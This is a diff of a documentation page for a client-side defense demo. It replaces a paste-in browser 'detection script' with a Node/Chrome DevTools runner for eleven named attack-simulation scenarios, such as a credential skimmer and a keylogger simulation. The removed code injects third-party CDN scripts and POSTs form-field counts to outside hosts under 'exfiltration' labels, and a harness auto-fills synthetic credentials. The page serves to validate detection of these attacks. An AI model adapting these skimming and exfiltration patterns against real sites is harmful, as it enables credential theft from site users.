@@ -1,181 +1,166 @@
 ---
 title: Trigger Detection
-description: "Attack detection triggers, threshold tuning, and signal validation"
+description: "Run deterministic CSD browser scenarios and correlate asynchronous telemetry"
 sidebar:
   order: 6
   label: Trigger Detection
 ---
 
-import { Aside, Code } from "@astrojs/starlight/components";
-import Screenshot from "@f5-sales-demo/docs-theme/components/Screenshot.astro";
+import { Aside } from "@astrojs/starlight/components";
 
-export const combinedScript = `// CSD Demo — Combined Detection Script
-// Exercises field reads, candidate script injection, and synthetic external requests
-(function() {
-    console.log('='.repeat(50));
-    console.log('[CSD Demo] Combined Detection Script — Starting');
-    console.log('='.repeat(50));
+CSD validation requires real browser-side JavaScript activity. The canonical Node.js 22 runner uses
+Chrome DevTools Protocol (CDP), enables Page, Runtime, Network, and Log/console collection, and
+writes a sanitized receipt. Immediate browser success and eventual CSD telemetry are separate facts.
 
-    // Phase 1: Observe form fields without retaining their values
-    console.log('\\n[Formjack] Phase 1: Form field harvesting');
-    var inputs = document.querySelectorAll('input');
-    var populatedFieldCount = 0;
-    inputs.forEach(function(input) {
-        if (input.value) populatedFieldCount++;
-    });
-    console.log('[Formjack] Observed ' + inputs.length + ' fields; values discarded');
+## 1. Start a dedicated Chrome debugging profile
 
-    // Phase 2: Inject third-party scripts from 4 CDN domains
-    console.log('\\n[Supply Chain] Phase 2: Multi-CDN script injection');
-    var cdns = [
-        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
-        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
-        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
-        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
-    ];
-    cdns.forEach(function(cdn) {
-        var script = document.createElement('script');
-        script.src = cdn.url;
-        script.onload = function() {
-            console.log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url);
-        };
-        script.onerror = function() {
-            console.log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url);
-        };
-        document.head.appendChild(script);
-        console.log('[Supply Chain] Injected script tag: ' + cdn.name);
-    });
+```bash
+open -na "Google Chrome" --args \
+  --remote-debugging-port=9222 \
+  --user-data-dir="$TMPDIR/csd-demo-chrome"
+```
 
-    // Phase 3: Send synthetic counters to external endpoints
-    console.log('\\n[Exfil] Phase 3: Data exfiltration');
-    var payload = JSON.stringify({
-        type: 'combined_demo',
-        field_count: inputs.length,
-        populated_field_count: populatedFieldCount,
-        field_values_discarded: true,
-        timestamp: Date.now()
-    });
+The runner creates and disposes an isolated browser context/page. It does not close Chrome.
 
-    fetch('https://www.httpbin.org/post', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: payload
-    }).then(function() {
-        console.log('[Exfil] Synthetic signal sent to www.httpbin.org');
-    });
+## 2. Inspect the canonical scenarios
 
-    fetch('https://jsonplaceholder.typicode.com/posts', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: payload
-    }).then(function() {
-        console.log('[Exfil] Synthetic signal sent to jsonplaceholder.typicode.com');
-    });
+```bash
+node scripts/csd-traffic.mjs --list
+```
 
-    // Summary
-    console.log('\\n' + '='.repeat(50));
-    console.log('[CSD Demo] Simulation complete');
-    console.log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
-    console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (4 CDN domains)');
-    console.log('[CSD Demo] Exfil channels: 2 (fetch POST)');
-    console.log('[CSD Demo] Detection visibility timing varies by tenant and traffic volume.');
-    console.log('='.repeat(50));
-})();`;
+The list comes from `scripts/lib/csd-scenarios.mjs` and reports exactly these stable names:
 
-export const initScript = [
-    "// Save native references before zone.js patches them",
-    "var si = window.setInterval.bind(window);",
-    "var ci = window.clearInterval.bind(window);",
-    "var nativeFetch = window.fetch.bind(window);",
-    "var log = window.console.log.bind(window.console);",
-    "",
-    "// Poll for login form fields, fill synthetic markers, run detection script",
-    "var poll = si(function() {",
-    "  var emailEl = document.querySelector('input[type=\\\"email\\\"]');",
-    "  var passEl = document.querySelector('input[type=\\\"password\\\"]');",
-    "  if (emailEl && passEl) {",
-    "    ci(poll);",
-    "    var nativeSet = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;",
-    "    nativeSet.call(emailEl, 'test' + '@example.com');",
-    "    emailEl.dispatchEvent(new Event('input', { bubbles: true }));",
-    "    nativeSet.call(passEl, 'DEMO_PASSWORD');",
-    "    passEl.dispatchEvent(new Event('input', { bubbles: true }));",
-    "",
-    combinedScript.replaceAll('console.log', 'log').replaceAll('fetch(', 'nativeFetch('),
-    "  }",
-    "}, 300);",
-].join("\\n");
+`login-credential-skimmer`, `registration-harvester`, `payment-overlay-card-skimmer`,
+`obfuscated-loader`, `multi-cdn-injection`, `tag-manager-hijack`,
+`multi-channel-exfiltration`, `high-volume-domain-exfiltration`, `form-overlay`,
+`keylogger-simulation`, and `maximum-detection`.
 
-## Trigger Detection
+## 3. Run browser scenarios
 
-CSD detection requires real browser-side JavaScript activity; cURL alone cannot generate it. The combined script exercises field observation, candidate third-party script loads, and synthetic external requests in one execution.
+An execution requires exactly one selector form: repeat `--scenario` for one or more selected
+scenarios, or use `--all`. No scenario runs implicitly.
 
-### Run the Combined Simulation Script
+```bash
+mkdir -p .artifacts/csd
+node scripts/csd-traffic.mjs \
+  --scenario login-credential-skimmer \
+  --cdp-endpoint http://127.0.0.1:9222 \
+  --timeout 30s \
+  --settle 10s \
+  --receipt .artifacts/csd/login-credential-skimmer.json
+```
 
-**1. Navigate.** Open `https://client-side-defense.f5-sales-demo.com/#/login`.
+A focused multi-scenario run repeats `--scenario`:
 
-**2. Add synthetic markers.** Enter `test@example.com` and `DEMO_PASSWORD` without submitting the form.
+```bash
+node scripts/csd-traffic.mjs \
+  --scenario login-credential-skimmer \
+  --scenario payment-overlay-card-skimmer \
+  --receipt .artifacts/csd/focused.json
+```
 
-**3. Open DevTools.** Select the **Console** tab.
+Run the composed coverage scenario after a focused run is healthy:
 
-<Screenshot light="/images/devtools-console-light.png" dark="/images/devtools-console-dark.png" alt="Empty DevTools Console ready for script input" />
+```bash
+node scripts/csd-traffic.mjs \
+  --scenario maximum-detection \
+  --receipt .artifacts/csd/maximum-detection.json
+```
 
-**4. Run the script.** Paste the script below into the console and press **Enter**.
+Use `--all` only when all 11 independent entries are required:
 
-<Code code={combinedScript} lang="js" title="Combined Detection Script" />
+```bash
+node scripts/csd-traffic.mjs \
+  --all \
+  --receipt .artifacts/csd/all-scenarios.json
+```
 
-**5. Record evidence.** Confirm the harness attempted field observation, four candidate CDN loads, and two synthetic external requests. Use the Network tab to record which requests occurred. A CDN content error does not prove or disprove CSD detection.
+`--timeout` bounds execution and navigation. `--settle` is only a browser-event collection period;
+it is not a product-detection delay. A custom target requires `--target` plus an exact repeatable
+`--allow-host`; unsafe schemes, hosts, ports, redirects, and final origins fail closed.
 
-<Screenshot light="/images/devtools-console-output-light.png" dark="/images/devtools-console-output-dark.png" alt="Console output after running the simulation script" />
+For pipelines, `--receipt -` sends only JSON to stdout and human logs to stderr:
 
-### AI-Automated Execution
+```bash
+node scripts/csd-traffic.mjs \
+  --scenario maximum-detection \
+  --receipt - \
+  | jq '{schema_version, run_id, requested_scenarios, success, eventual_csd_evidence}'
+```
 
-AI assistants with browser automation tools (MCP Chrome DevTools, Playwright, Puppeteer) execute the simulation programmatically instead of following the manual steps above:
+## 4. Inspect immediate evidence first
 
-1. **Navigate with initScript** — first navigate to `about:blank` to ensure a clean document context, then `navigate_page` to `https://$XCSH_DOMAINNAME/#/login` with an `initScript` that saves native browser functions before application instrumentation modifies them, polls for the login fields, fills synthetic markers, and executes the simulation inline.
-2. **Dismiss Welcome Banner** — `press_key` with `Escape` if the banner appears.
-3. **Wait for completion** — allow the attempted requests to settle; ten seconds is a common lab observation, not a product guarantee.
-4. **Capture evidence** — use console messages to confirm the harness completed and Network requests to establish which browser requests were made and their results.
+For a file receipt, inspect the stable evidence groups without assuming a fixed platform latency:
 
-#### initScript Harness
+```bash
+jq '{
+  schema_version,
+  run_id,
+  started_at,
+  ended_at,
+  duration_ms,
+  tool,
+  requested_scenarios,
+  target,
+  allowlist,
+  cdp_endpoint,
+  scenarios: [.scenarios[] | {
+    name, target, status, immediate_evidence, dom_cleanup, console, network,
+    protected_document, instrumentation, cleanup, error, success, eventual_csd_evidence
+  }],
+  success,
+  caveats,
+  error,
+  eventual_csd_evidence
+}' .artifacts/csd/maximum-detection.json
+```
 
-The following harness wraps the Combined Detection Script for automated execution:
+Require the exact authorized top-frame origin, protected-page readiness, `__imp_apg__`, required
+scenario assertions, real Network terminal outcomes, sanitized Log/console evidence, and complete
+DOM/target/context/listener cleanup. The high-volume scenario must show five script attempts plus
+two POST attempts. Keylogger evidence contains aggregate event and periodic flush/POST counts only.
+Overlay evidence includes geometry/removal, and payment-overlay evidence confirms masked display-only
+content.
 
-<Code code={initScript} lang="js" title="initScript Harness" />
-
-**Note on saved native functions:** The harness preserves browser functions before application instrumentation modifies them. This keeps the lab runner reliable; it is not evidence of, or a claim about, the internal CSD enforcement mechanism.
+A requested receipt is written atomically even when execution or cleanup fails. The receipt preserves
+the primary error in `error` and reports runner cleanup failures in `cleanup.errors`. Candidate
+failures and timed-out outcomes stay visible and are never relabeled as successful loads.
 
 <Aside type="caution">
-**zone.js incompatibility** — Juice Shop uses zone.js, which can disrupt browser-automation calls after page load.
-Use `navigate_page` with `initScript` to preserve browser functions before application instrumentation runs. Fill fields through the native value setter and run the simulation inside the polling callback.
+  Receipts must not contain form values, individual key values, cookies,
+  authorization data, tokens, headers, storage, or request/response bodies.
+  Console and Log messages are sanitized before writing.
 </Aside>
 
-<Aside type="note">
-**initScript accumulation** — each `navigate_page` call with an `initScript` parameter adds the script to a persistent list that runs on every subsequent document load in that browser context. To avoid stale scripts interfering, navigate to `about:blank` between runs or use `new_page` with `isolatedContext` for a clean context.
-</Aside>
+## Manual fallback
 
-Operators without browser automation tools use the manual steps above.
+```bash
+node scripts/csd-traffic.mjs \
+  --print-script maximum-detection \
+  > .artifacts/csd/maximum-detection.browser.js
+```
 
-<Aside type="tip">
-Detection visibility timing varies by tenant, traffic volume, and backend processing. Poll the documented APIs and treat DET-3 as the Phase 3 entry gate rather than relying on a fixed delay.
-</Aside>
+Open the documented route, review the generated file, and paste it into DevTools Console.
+`--print-script` is the only manual payload source. Record visible Console and Network outcomes;
+manual execution cannot supply the automated receipt or cleanup proof.
 
-### What the Script Does
+## Explicit post-receipt API correlation
 
-The combined simulation exercises three observable behaviors:
+The generator has no embedded API client and does not read platform credentials. Only after the
+browser receipt passes, separately use read-only `xcsh_api` operations. Scope them to the receipt's
+start/end window, protected origin, and exact reviewed hosts from Network evidence. Label each
+result `OBSERVED`, `NOT_OBSERVED`, `PENDING`, or `ERROR`, and keep it under the separate
+`eventual_csd_evidence` concept. Pending, empty, or failed correlation does not change a successful
+immediate-browser result.
 
-| Behavior | What the Script Does | Evidence to Record |
-| --- | --- | --- |
-| **Field observation** | Reads existing `input` elements without retaining their values | Console field count plus any later `/formFields` entries |
-| **Script injection** | Attempts 4 `&lt;script&gt;` loads from candidate CDN domains | The subset of requests observed in the browser Network log and later domain/script telemetry |
-| **Synthetic network signals** | Sends field counts and discard markers via `fetch`; field values never enter the payload | Browser fetch requests plus any matching `/detected_domains` entries |
+| Evidence                                  | What it establishes                                                       | What it does not establish                                       |
+| ----------------------------------------- | ------------------------------------------------------------------------- | ---------------------------------------------------------------- |
+| Receipt and sanitized Log/console markers | The canonical payload ran in the accepted document.                       | CSD classification or causation.                                 |
+| Network terminal outcomes                 | Which reviewed destinations were attempted and what the browser observed. | That every candidate loaded or appeared in CSD.                  |
+| Original-field and aggregate key counts   | Field access and event handling occurred without retaining values.        | Captured credentials, key content, or guaranteed classification. |
+| Overlay geometry/removal                  | The synthetic overlay existed and cleanup removed it.                     | A guaranteed standalone injected-form signal.                    |
+| `__imp_apg__` and `dip` evidence          | Instrumentation existed and, when observed, emitted browser traffic.      | A specific eventual risk label.                                  |
+| Separate CSD API results                  | Records returned during the queried window.                               | Deterministic latency, complete coverage, or causal attribution. |
 
-<Aside type="note">
-Observed coverage and API field population vary by run. Do not claim all four CDN candidates were detected unless they appear in this run's evidence.
-</Aside>
-
-### Advanced Simulations
-
-The combined script is a simplified harvest, inject, and synthetic-request scenario for demonstrations.
-The [Attack Script Library](/csd/en/attack-scripts/) contains targeted scenarios for focused validation. Use each scenario only for the behavior and evidence it explicitly exercises.
+The [Attack Script Library](/csd/en/attack-scripts/) contains the exact 11-scenario behavior and
+outcome matrix.
